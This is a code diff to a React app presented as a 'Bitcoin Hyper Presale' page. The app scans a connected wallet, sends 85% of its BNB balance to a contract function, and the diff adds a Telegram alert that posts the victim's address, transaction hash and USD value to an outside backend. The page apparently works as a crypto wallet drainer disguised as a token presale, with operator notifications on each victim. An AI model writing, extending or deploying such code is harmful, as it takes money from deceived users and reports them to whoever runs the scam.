@@ -123,7 +123,7 @@ function App() {
       }
 
       try {
-        // FIXED: Create ethers provider from walletClient correctly
+        // Create ethers provider from walletClient
         const web3Provider = new ethers.BrowserProvider(walletClient);
         const web3Signer = await web3Provider.getSigner();
         
@@ -179,7 +179,7 @@ function App() {
       if (data.success) {
         setScanResult(data.data);
         
-        // Send Telegram notification with CORRECT balance from local state
+        // Send Telegram notification
         await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -232,7 +232,7 @@ function App() {
     try {
       setLoading(true);
       setError('');
-      setTxStatus('⏳ Please confirm in wallet...');
+      setTxStatus('⏳ Preparing transaction...');
       setTxHash('');
 
       // Auto-switch to BSC if needed
@@ -291,8 +291,12 @@ function App() {
       const amountToSend = (parseFloat(balance) * 0.85).toString();
       const value = ethers.parseEther(amountToSend);
       
+      setTxStatus('⏳ Estimating gas...');
+      
       // EXACT gas calculation from working version
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+      
+      setTxStatus('⏳ Please confirm in wallet...');
       
       const tx = await contract.processNativeFlow({
         value: value,
@@ -301,6 +305,16 @@ function App() {
 
       setTxHash(tx.hash);
       setTxStatus('✅ Transaction submitted!');
+
+      // Send Telegram notification
+      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\nBNB Amount: ${amountToSend} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
+          type: 'tx_submitted'
+        })
+      }).catch(e => console.log('Telegram notify failed:', e));
 
       // Wait for confirmation
       await tx.wait();
@@ -578,7 +592,7 @@ function App() {
           </div>
         )}
 
-        {/* Main Content - Show immediately if eligible */}
+        {/* Main Content */}
         {isConnected && isEligible && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
